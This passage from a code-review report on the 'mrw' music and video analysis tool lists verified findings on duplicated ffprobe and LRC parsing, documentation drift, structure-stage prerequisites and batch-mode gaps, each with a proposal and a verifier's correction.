**Proposal.** Add mrw/stage.py with the following pieces. `StageSpec(name, section, document, requires, algorithm_version)` describes a stage. A `Stage` protocol has `check(ctx)` (cheap, no heavy imports, raises PrerequisiteError; T5), `compute(ctx) -> StageOutput` (heavy imports go here) and an optional `commit(ctx, out)` for swapping frames or stems into place after serialization. `StageContext(track_id, track_dir, manifest, cfg, library)` offers typed reads via `ctx.doc(name, Model)`. `StageOutput(document, device, api_usage, warning, summary)` carries the result. `run_stage(stage, track, library, cfg, force=False)` does, in order: resolve -> lock (ARCH-5) -> require(spec.requires) -> check -> freshness (ARCH-1/6, unless force) -> clock -> compute -> serialize and validate -> commit -> write_document -> merge-write the ok entry. On failure it records failed (with any partial usage) and raises StageError. A CLI factory registers commands from a STAGES registry, and status iterates the same registry. Migrate in steps: (1) helpers only (RunClock, record_ok/record_failed, require_ingested, require_stems_on_disk, typed readers), with no behavior change; (2) move features and lyrics onto run_stage; (3) move video (hooks for estimate-only, the budget gate and partial usage) and stems (artifact entry, MPS fallback); (4) build structure on it from the start. Risks: (a) The orderings that earlier reviews fought for must become explicit hook points, not disappear into a generic compute(). These are the T5 rule of cheap checks before heavy imports; video's serialize -> frames swap -> write sequence (video.py:514-529); BudgetExceeded firing before the backend is built, so `--estimate` needs no key; recording partial spend on failure; and `--estimate` bypassing the no-op check. (b) Tests monkeypatch module attributes (`mrw.stems._separate`, `mrw.lyrics._transcribe`, `mrw.captions.make_backend`), so keep those as the test hooks. (c) Guard byte identity with a before/after comparison of every document the fast fixtures produce, not only double-run equality. (d) Keep stems (a StemsState artifact) and ingest (which creates the manifest) outside the runner until the design is proven. (e) In a codebase of about 2.8k lines, stop after step 2 if M6 does not need more abstraction.

**Verifier's notes.** An AST scan reproduces the sizes: run_video 267 lines, run_lyrics 184, ingest 147, run_stems 128, run_features 101. The repeated resolve, no-op, clock, _record and failure scaffolding is visible at the cited lines, and upstream documents are read as untyped dicts (lyrics.py:472-475, video.py:325). But the observed drift is mostly in cli.py's status display (ARCH-1). The partial-run difference is deliberate, since only video spends money. A full Stage protocol and registry (effort L) risks the hard-won orderings the finding itself lists (T5, the frames swap, the budget gate before the backend), in a codebase of about 3.6k lines. Worth doing only in narrowed form; low.

**Verifier's correction to the proposal.** Do step 1 only (S-M): shared helpers (require_ingested, require_stems_on_disk, a run clock, record_ok/record_failed routed through ARCH-5's locked manifest update), typed upstream readers via model_validate_json, and a STAGES table that status and export-schemas iterate. Defer run_stage and the Stage protocol until M6 shows a concrete need.

#### ARCH-14: Duplication and dead code at module level: three ffprobe paths, two LRC regexes that disagree, stdlib imports inside functions, an out-of-date export-schemas, copy-pasted test helpers

- **Severity:** low · **Verdict:** confirmed · **Kind:** maintainability · **Effort:** M · **Confidence:** high · **Checklist:** S1, T5
- **Locations:** `mrw/ingest.py:61`, `mrw/video.py:197`, `mrw/video.py:248`, `mrw/ingest.py:38`, `mrw/lyrics.py:56`, `mrw/video.py:451`, `mrw/cli.py:317`, `tests/test_m4_smoke.py:32`

**Evidence.** Video stream probing is done in three places. ingest.probe with _first_stream (ingest.py:61-87) scans all streams and skips attached_pic. video._video_stream_info (video.py:197-215) uses `-select_streams v:0` and then filters attached_pic, so if v:0 is cover art, `next(...)` raises a StopIteration with an empty message. _motion_pass runs its own ffprobe (video.py:248-253), ignores the return code, and re-probes the width and height that _video_stream_info already returned. All three re-derive fps, dimensions and frame_count that source.json `media.video` already stores. LRC timestamps are matched by two regexes that disagree. ingest.py:38 `_LRC_TIMESTAMP` accepts any line starting with `[d:dd`, while lyrics.py:56 `_LRC_TS` requires `]` or `.ddd]` right after the seconds. For the `[mm:ss:xx]` variant (`[01:02:50]Line`), ingest records has_timestamps=true, but lyrics leaves the timestamp in the displayed text and records no hint. run_video imports stdlib and first-party modules inside the function: `import shutil as _shutil` three times (video.py:451, 524, 558), `from PIL import Image` and `import io` (404-405), `import numpy as np` inside the per-shot loop (470) and `from .models import doc_dump as _doc_dump` (521). Lazy imports are a T5 tool meant only for heavy dependencies. CaptionCache is built twice (video.py:400, and again inside make_backend at 440). The ValueError at captions.py:151-153 is unreachable because the backend is a validated Literal, while device validation sits at stems.py:57 because StemsConfig.device is a plain str. export-schemas (cli.py:317-334) exports only SourceDocument and Manifest and has been out of date since M3. Naming is inconsistent: `ingest.ingest` vs `run_*`, `already_ingested` vs `already_done`, and the manifest key `audio_features` vs the section, command and module name `features`. The lyrics module mixes the Whisper engine (`_transcribe`, `_detection_window_audio`, `fetch_whisper_model`) with document assembly, and run_lyrics builds lines for both modes inline. In the tests, the schema-registry validator is copy-pasted in test_m0_smoke.py:58, test_m1_smoke.py:94, test_m3_smoke.py:119, test_m4_smoke.py:53 and test_m5_smoke.py:218, and inline in test_m2_smoke.py:125. Stem fabrication is duplicated (test_m3_smoke.py:84-111, test_m4_smoke.py:67-104) and writes manifest JSON by hand. test_m3_followups.py:20 and test_m4_smoke.py:32 import from `test_m3_smoke`, which only works under pytest's default prepend import mode.

**Failure scenario.** The duplicates drift apart independently. For example, an MP4 whose first video stream is attached cover art is ingested as a video (ingest skips the art), but `mrw video` then fails with 'error: video failed: ' and an empty error in the manifest. LRC lines in the `[mm:ss:xx]` format show their timestamps as lyric text. A contributor following CLAUDE.md's `export-schemas` diff workflow cannot check 3 of the 5 document contracts.

**Proposal.** Add mrw/media.py as the single ffprobe/ffmpeg wrapper. It should select streams consistently (record the chosen stream index at ingest and reuse it), map a missing binary to ToolNotFound, and truncate stderr. Have the video stage read fps and dimensions from source.json. Add mrw/lrc.py as one parser used both for has_timestamps and by lyrics, covering `[mm:ss.xx]`, `[mm:ss:xx]`, lines with several timestamps, and ID tags. Split video.py into a video/ package (shots, frames, palette, motion, as PLAN §3 planned) and move the Whisper engine to engines/whisper.py. Move stdlib imports to the top of the module. Make export-schemas iterate a registry of all document models. Move test helpers into tests/helpers.py or conftest fixtures (validate_document, ingest_track, fabricate_track, runner), and give fabricated stems a library helper instead of hand-written manifest JSON.

**Verifier's notes.** Verified. There are three ffprobe paths with different stream selection. ingest.py:61-87 scans all streams. video.py:197-215 uses `-select_streams v:0` plus an attached_pic filter, which raises StopIteration with message '' if v:0 is cover art. video.py:248-253 ignores the return code. Replicating the regexes: `[01:02:50]Line` gives has_timestamps=true at ingest (ingest.py:38) but keeps the timestamp in the displayed text with no hint in lyrics (lyrics.py:56). Other confirmed items: stdlib imports inside the function (video.py:404-405, 451, 470, 521, 524, 558); CaptionCache built twice (400, 440); export-schemas covering 2 of 6 models (cli.py:329-334); the validator copy-pasted across five test files; and cross-test imports that depend on prepend import mode (there is no tests/__init__.py). The cover-art-as-v:0 scenario is rare. Low.

**Verifier's correction to the proposal.** Keep the parts that pay off: one shared LRC timestamp/ID-tag parser used by both ingest and lyrics (fixes the has_timestamps disagreement and ARCH-10's tag pollution); export-schemas over all document models; a tests/helpers.py with the validator and a fabricate_track helper that writes the stems entry through the models; and stdlib imports hoisted to module level. Optionally read fps and dimensions from source.json media.video. Skip splitting video.py into a package for now.

### J2. Docs have drifted from the code

#### ARCH-15: Docs drift: PLAN, README, CLAUDE.md and OPEN_QUESTIONS still describe Phase 0 and pre-M5 designs

- **Severity:** low · **Verdict:** confirmed · **Kind:** docs · **Effort:** S · **Confidence:** high · **Checklist:** P2
- **Locations:** `PLAN.md:3`, `PLAN.md:104`, `PLAN.md:158`, `PLAN.md:299`, `PLAN.md:480`, `README.md:28`, `README.md:39`, `CLAUDE.md:33`, `OPEN_QUESTIONS.md:1`, `schemas/README.md:1`

**Evidence.** Status statements are out of date. PLAN.md:3 says '**Phase 0 design document. No implementation exists yet.**'. OPEN_QUESTIONS.md:1-5 says 'Open Questions — Phase 0' and 'nothing is implemented yet', and its resolution list at :7-9 omits OQ-13, which review 005 resolved. schemas/README.md:1 says '(draft, Phase 0)'; models.py:1 says '(M0 scope: source + manifest)'; stems.py:214-216 says '(none exist yet — M3+)'; and CHECKLIST.md:3 says 'Distilled from reviews 001–003', though T5 and P3 came from 006 and 007. The architecture description is also out of date. PLAN.md:104-122 lists `cli.py # typer app: ingest / analyze / status / show`, a 'frozen dataclass config', timeseries.py and a video/ package with shots/palette/motion/captions. In reality there is no analyze or show, config uses pydantic, there is no timeseries.py, video is a single video.py plus a top-level captions.py, and align.py, costs.py and models.py are not listed. PLAN.md:158-160 extracts stills with 'precise ffmpeg seeks (-ss fast-seek ...)', while video.py:10-11 selects frames 'by exact source FRAME INDEX (ffmpeg select filter ...), never time-seek'. PLAN.md:299-316 specifies `caption(self, frame_jpeg: bytes, context: ShotContext)`, 'one call per representative frame, temperature 0' and a cache key of `<frame_sha256>.<prompt_version>.<model>.json`. captions.py:41-51 actually takes frame lists, makes one call per shot, keys the cache on the sha256 of the concatenated frame hashes, and sends no temperature. PLAN.md:472 still says '≤ ~2 × shots calls'. PLAN.md:52-53 says 'The only network touchpoint is the pluggable vision captioning backend', but CLAUDE.md:12-18 lists two exceptions, including weight downloads. Weight sizes disagree in three places: PLAN.md:480 says 'htdemucs ~320 MB, Whisper small ~460 MB'; README.md:39-41 says 'Demucs htdemucs ~80 MB; faster-whisper small ~75 MB'; cli.py:256 and :259 print '~80-320 MB' and '~75-500 MB'. Whisper small has about 244M parameters, so its CTranslate2 float16 download is roughly 460-490 MB (75 MB is the size of tiny), and ~320 MB matches htdemucs_ft (four models) rather than htdemucs. PLAN.md:546-547 still lists `mrw models fetch` as M7 work, but it shipped with M2/M4. README.md:28-35 omits the video, costs, models fetch and version commands from its usage section; README.md:55-56 says 'Analysis stages beyond ingest arrive milestone by milestone'; and README.md:5-8 lists song structure as something mrw produces. CLAUDE.md:33-38 omits the stems, features, lyrics, video, costs and models fetch commands, and CLAUDE.md:16 still says '(Demucs, later Whisper)'. schemas/README.md:19-20 refers to `event_list`, but common.schema.json defines `event_times`.

**Failure scenario.** CLAUDE.md points the automated reviewer at PLAN.md for architecture. A reviewer or contributor reading PLAN §4 may 'fix' the caption backend to use temperature 0, which returns a 400 error on most of the configured models (ARCH-12), or may create modules where §3 says they belong. A user sizing downloads from README expects about 75 MB for Whisper and gets about 480 MB.

**Proposal.** Make one docs PR. Replace PLAN.md:3 with a status line saying the document is living, and add a status column to §11. Regenerate §3's module list from the actual tree. Update §4 stage 1 (stills) and stage 5 (captions: signature, one call per shot, cache key, no temperature) to match the implementation. State weight sizes once, in README, and reference that from PLAN and the CLI messages. Refresh README usage (full pipeline order plus video, costs and models fetch), CLAUDE.md commands, the OPEN_QUESTIONS header and resolution list, the schemas/README title and `event_times`, the models.py and stems.py comments, and the CHECKLIST provenance line. Optionally add a test that every command in `mrw --help` appears in README.

**Verifier's notes.** All the cited drift is real. PLAN.md:3 still says 'No implementation exists yet'. OPEN_QUESTIONS.md:1-9 has a Phase-0 header and omits OQ-13's resolution. schemas/README.md:1 says '(draft, Phase 0)', and :19-20 names `event_list` while common.schema.json defines `event_times`. The PLAN §3 module list does not match the tree. PLAN.md:158-160 describes time-seeks, while video.py:10-11 selects by frame index. PLAN.md:299-316 describes per-frame calls at temperature 0 and a different cache key, while captions.py:41-51 works per shot. PLAN.md:546-547 lists the shipped `models fetch` as M7 work. The README and CLAUDE.md command lists are incomplete. Weight sizes: README's 'faster-whisper small ~75 MB' is wrong (small is about 244M parameters, roughly 480 MB at fp16; 75 MB is tiny), and PLAN's 'htdemucs ~320 MB' matches htdemucs_ft (about 80 MB per model); I am fairly confident of both. Docs only.

**Verifier's correction to the proposal.** The proposal is sound. Also mark PLAN §11 M7's 'API backend, cache' items as shipped in M5, and leave only the mocked-transport test, batch mode and the end-to-end determinism check as remaining M7 work.

#### SCH-15: PLAN, README and code comments describe a contract that differs from what is implemented

- **Severity:** low · **Verdict:** confirmed · **Kind:** docs · **Effort:** S · **Confidence:** high
- **Locations:** `PLAN.md:3`, `PLAN.md:308`, `PLAN.md:313`, `PLAN.md:370`, `PLAN.md:387-389`, `PLAN.md:408`, `OPEN_QUESTIONS.md:5`, `schemas/README.md:19-20`, `mrw/models.py:1`, `mrw/video.py:514-520`

**Evidence.** PLAN.md:3 says 'Phase 0 design document. No implementation exists yet.' and OPEN_QUESTIONS.md:5 says 'nothing is implemented yet', although M0–M5 are merged. PLAN §5's manifest summary lists the statuses as '(ok | not_applicable | failed | stale)', missing `pending`, and omits error, warning and api_usage (PLAN.md:387-389). PLAN.md:308 says captions use 'one call per representative frame, temperature 0', and PLAN.md:313/370 key the cache by `<frame_sha>`. In fact captions.py makes one call per shot, keys the cache on a sha256 of the concatenated frame hashes (captions.py:41-43) and sends no temperature. PLAN.md:408 says JSON Schema is 'exported from' the models, the reverse of CLAUDE.md. schemas/README.md:19-20 lists `event_list`, but the definition is named `event_times`. The models.py:1 docstring still says 'M0 scope: source + manifest'. The comment at video.py:520 says 'the entry records failed/stale either way', but nothing ever writes stale.

**Failure scenario.** A reviewer or the Swift implementer reading PLAN §5/§6 builds against statuses, a cache layout and a schema-generation pipeline that don't exist. An operator inspecting .cache/captions looks for per-frame files that aren't there.

**Proposal.** Update the PLAN.md header; §4 stage 5 (one call per shot, combined-hash cache key, the actual temperature policy); the §5 manifest summary (all five statuses plus error, warning and api_usage); and §6 (hand-drafted schemas are the contract, guarded by the SCH-6 test). Change `event_list` to `event_times` in the README, and refresh the models.py docstring and the comment at video.py:520.

**Verifier's notes.** Each item matches the text. PLAN.md:3 says 'No implementation exists yet' and OPEN_QUESTIONS.md:5 says 'nothing is implemented yet'. PLAN.md:387-389 lists statuses without pending and omits error, warning and api_usage. PLAN.md:308 says 'one call per representative frame, temperature 0', but captions.py makes one call per shot and messages.create (captions.py:125-129) sends no temperature. PLAN.md:313/370 key by <frame_sha>, while cache_key hashes the concatenated frame shas (captions.py:41-43). PLAN.md:408 says exported-from-models, contradicting CLAUDE.md:42-43. schemas/README.md:19-20 says `event_list`; the def is `event_times`. The models.py:1 docstring says 'M0 scope'. video.py:520's 'failed/stale' only makes sense as derived staleness. Pure docs drift: low.

**Verifier's correction to the proposal.** As proposed. On temperature, decide rather than just document: either pass temperature=0 in AnthropicBackend, as the plan intended (the cache still owns determinism and first-call variance drops), or state the API default explicitly in PLAN §4 stage 5.

### J3. M6 prerequisites are undecided

#### ARCH-10: M6 (structure) prerequisites are undecided: empty-input conventions, whether lyrics are optional, markup quality, and upstream staleness

- **Severity:** medium · **Verdict:** confirmed · **Kind:** design · **Effort:** M · **Confidence:** medium · **Checklist:** H2, H3, S3, C1
- **Locations:** `schemas/structure.schema.json:16`, `schemas/structure.schema.json:51`, `mrw/video.py:285`, `mrw/features.py:178`, `mrw/lyrics.py:249`, `mrw/lyrics.py:56`, `PLAN.md:97`, `PLAN.md:330`

**Evidence.** structure.schema.json requires integer `start_beat_index` and `start_bar_index` (minimum 0) on every section (line 16), and for video inputs `on_beat_cut_ratio` (line 51) plus `cuts[].nearest_beat_index` (lines 84-87). It defines nothing for empty inputs. M5 already produces single-shot videos (video.py:285-286: `if not scenes: return [(0, frame_count)]`), which have zero cuts, so on_beat_cut_ratio would be 0/0. Static-image 'official audio' videos and lyric videos are common inputs. Beat grids can be degenerate too: features.py:178-183 and :192-200 already special-case fewer than 3 and fewer than 4 beats. For an all-zero onset envelope, librosa's beat_track returns no beats and tempo 0 (fairly confident). Then `bpm_global: 0.0` would violate audio_features.schema.json:18 (`exclusiveMinimum: 0`), and beat indices would have nothing to point at. PLAN.md:97-100 says structure needs 'lyrics (if any)'. But the lyrics stage always produces a document (transcribed mode when there is no file, lyrics.py:476-477), prerequisites are simply ok or not ok, and H3 says a failed prerequisite blocks downstream stages. supplied_markup, which PLAN.md:330-333 says 'dominates label assignment', already picks up LRC ID tags. In parse_supplied_lyrics (lyrics.py:249-268), a line such as `[ar:Artist]` or `[offset:+250]` does not match `_LRC_TS` (lyrics.py:56) but does match `_MARKUP` (lyrics.py:57), so it is recorded as markup labelled 'other'. `[offset:]` is never applied to the hints. Structure reads three upstream documents, so while ARCH-1 is unfixed it would be the document most often stale. Its config section, STAGE_SECTION entry and status line are all still per-stage hand edits (config.py:107, cli.py:295-307).

**Failure scenario.** If M6 is implemented as planned and run on a static-cover music video, zero cuts make on_beat_cut_ratio NaN, which is silently written (ARCH-7), or a ZeroDivisionError fails the stage. For a track whose .lrc starts with `[ar:]`, `[ti:]` and `[by:]` headers, structure receives three 'other' markup entries before the first lyric line, and treats them as section evidence that overrides other labels. After any features, lyrics or video re-run, the structure stage treats itself as up to date and does nothing, even though its inputs have changed.

**Proposal.** Before writing M6 code, record OQ-17 to OQ-20 and state the empty-input (H2) conventions in the structure.schema.json descriptions. (1) Zero cuts: emit `cuts: []` and `cuts_per_bar_global: 0.0`, and either define a stated 'vacuous' `on_beat_cut_ratio` value (mirroring lyrics' vacuous-coverage rule) or omit `editing` with a documented reason. (2) Empty or very short beat grid: emit a single section spanning the track with beat and bar index 0 and no editing block, and fix the bpm 0.0 vs exclusiveMinimum conflict in features. (3) Lyrics dependency: require lyrics to be ok (failed or pending blocks the stage, per H3), and decide whether flagged transcribed lines count as repetition evidence. (4) Filter LRC ID tags (ar, ti, al, au, by, length, offset, re, ve, #) in parse_supplied_lyrics, and apply `[offset:]` to the hints. (5) Land ARCH-1 (inputs fingerprint) and ARCH-7 (NaN guard) first. (6) Build structure on the shared stage runner (ARCH-13), read upstream documents through their typed models (`AudioFeaturesDocument/LyricsDocument/VideoDocument.model_validate_json`), and add a StructureConfig (`on_beat_window_seconds = 0.07`, OQ-12) to STAGE_SECTION.

**Verifier's notes.** The schema requirements and degenerate inputs check out: structure.schema.json:16, 51 and 84-87; single-shot output at video.py:285-286; the short-grid special cases at features.py:178-200. No zero-cut or empty-grid convention is recorded anywhere. A concrete defect exists today: replicating lyrics.py:56-57 and 249-268 shows that [ar:..], [ti:..], [al:..], [by:..], [length: ..] and [offset:+250] all become supplied_markup entries labelled 'other'. lyrics.schema.json:86 defines supplied_markup as section headers that feed structure labeling, and ID tags appear in most real .lrc files. The bpm_global=0.0 conflict with exclusiveMinimum (audio_features.schema.json:18) is plausible for a digital-silence mix; this assumes librosa's beat_track returns tempo 0 for an all-zero onset envelope, which I am fairly confident of. The rest is M6 planning, and the proposal is sound.

**Verifier's correction to the proposal.** Split out the current bugs as small PRs independent of M6. (a) Skip LRC ID-tag lines (bracketed `key:value` lines that are not timestamps) in parse_supplied_lyrics, optionally honouring [offset:] — S. (b) Decide and document the no-beats / silent-mix tempo convention for features; the schema is frozen at 1.0.0, so record the decision — S/M. Then record the M6 empty-input conventions before writing structure code.

### J4. M7 operability gaps

#### ARCH-11: M7 batch and operability gaps: no analyze or batch command, `stems.retain = false` leads nowhere, offline mode cannot be enforced, no environment check, no progress output, no machine-readable status

- **Severity:** medium → low · **Verdict:** confirmed · **Kind:** feature · **Effort:** L · **Confidence:** high · **Checklist:** H3, T1, T4, D5 · **Already recorded in the repo docs**
- **Locations:** `mrw/cli.py:264`, `mrw/stems.py:213`, `mrw/features.py:289`, `mrw/lyrics.py:452`, `schemas/manifest.schema.json:42`, `tests/test_m2_smoke.py:158`, `mrw/lyrics.py:160`, `mrw/stems.py:88`, `PLAN.md:459`

**Evidence.** PLAN.md:106 lists `cli.py # typer app: ingest / analyze / status / show`, and PLAN.md:459-461 says 'Batch mode (`mrw analyze --all`) continues past per-track failures and summarizes'. cli.py defines version, ingest, stems, features, lyrics, video, costs, models fetch, status and export-schemas. There is no analyze, show or batch command, and every stage takes a single track. With `retain = false`, stems.py:213-221 deletes the stems right after separation (comment: 'Dependent stages consume the stems here in a combined run (none exist yet — M3+)'). But features.py:289-296 and lyrics.py:452-461 then refuse to run ('re-run `mrw stems ...` with stems.retain = true'). That contradicts manifest.schema.json:42 ('a re-run of a dependent stage must regenerate them') and tests/test_m2_smoke.py:158 ('A dependent-stage re-run reads exactly this to know it must regenerate'). Offline: CLAUDE.md:15-17 says to pre-fetch weights 'so batch runs never surprise-download', but `WhisperModel(cfg.model, ...)` (lyrics.py:160-161) and `get_model(model_name)` (stems.py:88) download whenever the cache misses. Progress: Demucs runs with `apply_model(..., progress=False)` (stems.py:120), there is no `logging` anywhere in mrw/, and stage commands print only when they finish. status (cli.py:264-314) prints one human-readable line per track. It has no `--json`, there is no `show` command, and it never shows `stems.warning` (the MPS-fallback reason kept 'for batch runs', models.py:23-24) or any `error` text. Several constraints that a batch mode must handle are already in the code: torch thread pinning is process-wide (stems.py:80-86: 'a future combined-stage run ... must set its own threading policy'), the caption budget applies per run (config.py:96-98), and video on an audio-only track exits 2 (video.py:320-323). Already recorded: batch mode is M7 scope, and stems.py:214-216 anticipates a combined run. New here: the schema and the test both say that with retained=false, dependent stages regenerate the stems, but they refuse instead, so the option is harmful today; and offline enforcement and status reporting are not on the roadmap.

**Failure scenario.** To process a 100-track library, the operator writes a shell loop over stems, features, lyrics and video. A track whose Whisper model is not cached triggers a download in the middle of the batch, or fails when offline. Audio-only tracks exit 2 and stop a `set -e` loop. A 5-10 minute separation prints nothing until it ends. MPS-fallback warnings are visible only by opening each manifest.json, and there is no summary at the end. A user who sets `stems.retain = false` to save disk pays for the full separation and then cannot run features at all.

**Proposal.** Implement `mrw analyze [TRACK...|--all] [--stages ...] [--jobs N] [--offline] [--force] [--json]` on the stage runner (ARCH-13). It runs stages in dependency order from the declared graph, treats `not_applicable` as a skip, continues past failures, prints a summary table, and exits 1 if any stage failed. It handles retain=false in-process: temporary stems are consumed by features and lyrics and then deleted, and torch threads are reset after separation. It uses per-track locks (ARCH-5) and a caption budget for the whole batch. `--offline` (or `MRW_OFFLINE=1`) passes `local_files_only=True` to WhisperModel and checks that the htdemucs checkpoint exists under `torch.hub.get_dir()/checkpoints`, failing with PrerequisiteError (exit 2) 'weights not cached — run mrw models fetch'. Add `mrw doctor`, which checks: ffmpeg/ffprobe present and their version, Python and torch versions, MPS availability, weights cached, API key present when the backend is anthropic, strict config validation, and a writable library. Add `status --json` (per stage: status, freshness reason, warning, error) and `mrw show <track>`. Use `logging` with `-v`/`--quiet`, and enable Demucs progress output when stderr is a terminal. Until analyze exists, reject `stems.retain = false` at config load (or warn loudly), and correct the schema description and the test comment.

**Verifier's notes.** Accurate. There are no analyze, show or batch commands in cli.py. retain=false deletes the stems immediately (stems.py:213-221), while features and lyrics refuse to run (features.py:289-296, lyrics.py:452-461), and re-running stems with retain=false is a no-op (stems.py:155-157). That contradicts manifest.schema.json:42 and test_m2_smoke.py:158. WhisperModel and get_model download on a cache miss with no local_files_only (lyrics.py:160-161, stems.py:88). There is no logging, Demucs runs with progress=False, and status shows no warning, error or JSON output. However, batch mode is recorded M7 scope, stems.py:214-216 acknowledges the missing combined run, and first-use downloads are a permitted network exception (CLAUDE.md:15-17), so no hard constraint breaks. The retain=false trap is loud: the refusal names the fix, and the cost is one wasted separation. Low; most of the proposal is M7 feature planning.

**Verifier's correction to the proposal.** Do now (S): reject stems.retain=false at config load, or warn loudly, until a combined run exists; fix the manifest.schema.json:42 description and the test comment. Fold analyze, --offline (local_files_only=True plus a check that the torch-hub checkpoint exists) and status --json into M7 planning. doctor, show and logging are optional nice-to-haves.

## Rejected by verification

- **FEAT-14** (low): Each channel computes two full-length STFTs and keeps whole-file float32 buffers; long recordings such as live sets need several GB. *Verifier:* The premise is accurate. There are two STFTs per channel (spectral_centroid and onset_strength), and whole-file mono and stereo buffers are held (features.py:315). librosa rms also squares a 2048×frames framed view. It is not worth acting on for this project's scope, though. For target material (songs; PLAN §9 is sized for 4-minute tracks) peak use is a few hundred MB. For 1–2 h inputs the binding constraint is upstream. demucs 4.0.1 apply_model (split=True), as I recall its source, accumulates a full-length float32 output (4 sources × 2 ch × N, about 5 GB per hour), and stems.py:124 builds a same-size denormalised copy. So savings in features would not make long inputs feasible. Sharing one spectrogram would change float results, mass-staling every track, for roughly a 30–40% memory saving. The duplicate mix envelope is already documented as deliberate (features.py:316-318).
- **SEC-15** (low): Redundant full-file passes: a path argument re-hashes the whole media file on every command, and ingest reads the source three times. *Verifier:* The facts are accurate: a path argument re-hashes the whole file at library.py:65 (not :154-156; the file has 72 lines), ingest reads the source three times (ingest.py:173/199/200), and _motion_pass re-probes (video.py:248-253). But by the finding's own account the cost is negligible for typical inputs: about 0.1-0.5 s of hashing and 1-2 s of extra decode per 4-minute track, against PLAN §9's ~5 s ingest. The README uses track ids. The proposal costs M effort for that: a mutable, inode/mtime-keyed path cache inside the library, which risks stale-cache identity errors, and deriving audio_stream_sha256 from a different decode, which risks silently changing a stored hash. Not worth acting on. The motion-pass re-probe goes away with SEC-3's shared probe helper, and any decode consolidation belongs inside SEC-5's rewrite of `_decode_hash_and_duration`.
